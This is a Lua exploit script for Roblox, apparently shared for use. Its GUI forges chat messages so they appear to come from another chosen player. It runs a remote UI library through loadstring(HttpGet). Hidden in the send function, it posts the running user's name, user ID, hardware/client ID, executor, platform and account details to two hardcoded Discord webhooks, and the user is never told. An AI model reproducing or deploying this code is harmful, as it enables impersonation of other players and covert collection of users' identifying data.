-- Carrega WindUI
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()

local Chat = game:GetService("Chat")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local UIS = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

-- WEBHOOKS
local webhook1 = "https://discord.com/api/webhooks/1482969766678237185/eRVTjo-bG0Ols1JWwrIIstP0vgSRpxe_jd_gH6O8iTImxe4eOLE6o3Rlt4cW226iSC3F"
local webhook2 = "https://discord.com/api/webhooks/1482748334006472788/2Tfx1RIFY-uQPEbXt8xmcCS4-vUwTwXsdxjsHWQk6dHr8XBDw224Ieu7etI5Z5YtxwjE"

pcall(function()
    Chat.BubbleChatEnabled = true
end)

pcall(function()
    Players.BubbleChat = true
    Players.ClassicChat = true
end)

-- fake chat
local function fakeChat(playerName, message)
    local target = Players:FindFirstChild(playerName)
    if not target or not target.Character then return false end
    local head = target.Character:FindFirstChild("Head")
    if not head then return false end

    pcall(function()
        Chat:Chat(head, message, Enum.ChatColor.White)
    end)

    pcall(function()
        StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = playerName .. ": " .. message,
            Color = Color3.fromRGB(255,255,255),
            Font = Enum.Font.SourceSansBold,
            TextSize = 18,
        })
    end)
    return true
end

-- webhook (envia para os dois)
local function sendWebhook(fakePlayer, fakeMessage)
    local player = Players.LocalPlayer
    local executor = identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "Unknown"
    local platform = UIS.TouchEnabled and "Mobile" or (UIS.KeyboardEnabled and "PC" or "Unknown")
    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
    local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name

    local data = {
        ["embeds"] = {{
            ["title"] = "Script Executed",
            ["color"] = 255, -- azul
            ["fields"] = {
                {name="Player", value=player.Name, inline=true},
                {name="User ID", value=tostring(player.UserId), inline=true},
                {name="Display Name", value=player.DisplayName, inline=true},

                {name="Game", value=gameName, inline=true},
                {name="Place ID", value=tostring(game.PlaceId), inline=true},

                {name="Platform", value=platform, inline=true},
                {name="Executor", value=executor, inline=true},

                {name="HWID", value=hwid, inline=false},
                {name="Region", value="BR", inline=true},

                {name="Account Age", value=player.AccountAge.." days", inline=true},
                {name="Membership", value=tostring(player.MembershipType), inline=true},

                {name="Team", value=(player.Team and player.Team.Name or "None"), inline=true},

                {name="Fake Player", value=fakePlayer, inline=true},
                {name="Fake Message", value=fakeMessage, inline=false}
            }
        }}
    }

    local json = HttpService:JSONEncode(data)
    local request = syn and syn.request or http_request or request

    -- envia para webhook1
    request({
        Url = webhook1,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = json
    })

    -- envia para webhook2
    request({
        Url = webhook2,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = json
    })
end

-- Variáveis
local SelectedPlayer = nil
local MessageText = ""

-- Janela
local Window = WindUI:CreateWindow({
    Title = "EB Apex (Fake Message)",
    Icon = "shield",
    Author = "feito por dan",
    Folder = "MySuperHub",
    Size = UDim2.fromOffset(580, 460),
    Transparent = true,
    Theme = "Dark",

    User = {
        Enabled = true,
        Anonymous = false,
        Name = "feito por dan",
        Callback = function()
            print("User clicado!")
        end
    }
})

-- Aba
local MessageTab = Window:Tab({
    Title = "Mensagem",
    Icon = "message-circle"
})

-- Lista jogadores
local PlayerList = {}
for _, plr in pairs(Players:GetPlayers()) do
    table.insert(PlayerList, plr.Name)
end

-- Dropdown
local PlayerDropdown = MessageTab:Dropdown({
    Title = "Selecionar jogador",
    Values = PlayerList,
    Callback = function(v)
        SelectedPlayer = v
    end
})

-- atualizar lista
local function updatePlayerList()
    PlayerList = {}
    for _, plr in pairs(Players:GetPlayers()) do
        table.insert(PlayerList, plr.Name)
    end
    PlayerDropdown:UpdateValues(PlayerList)
end

Players.PlayerAdded:Connect(updatePlayerList)
Players.PlayerRemoving:Connect(updatePlayerList)

-- input mensagem
MessageTab:Input({
    Title = "Mensagem",
    Placeholder = "Digite a mensagem...",
    Callback = function(text)
        MessageText = text
    end
})

-- botão enviar
MessageTab:Button({
    Title = "Enviar",
    Callback = function()
        if not SelectedPlayer then
            WindUI:Notify({
                Title = "Erro",
                Content = "Escolha um jogador",
                Duration = 3
            })
            return
        end

        if MessageText == "" then
            WindUI:Notify({
                Title = "Erro",
                Content = "Digite uma mensagem",
                Duration = 3
            })
            return
        end

        fakeChat(SelectedPlayer, MessageText)
        sendWebhook(SelectedPlayer, MessageText) -- envia para os dois webhooks
    end
})

WindUI:Notify({
    Title = "WindUI carregado!",
    Content = "Fake Message pronto",
    Duration = 5
})
